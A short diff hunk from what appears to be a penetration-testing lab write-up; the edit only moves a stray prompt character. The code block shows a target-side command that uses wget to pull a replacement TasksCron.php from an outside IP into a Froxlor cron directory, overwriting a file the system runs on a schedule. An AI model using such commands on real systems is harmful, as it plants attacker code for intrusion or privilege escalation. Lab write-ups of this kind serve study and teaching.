@@ -762,7 +762,8 @@ MariaDB [(none)]> show databases;
 
 ```sh
 # Target
-cd /var/www/html/froxlor/lib/Froxlor/Cron/System$
+cd /var/www/html/froxlor/lib/Froxlor/Cron/System
+$
 wget 192.168.45.249:22/TasksCron.php -O TasksCron.php
 ```
 
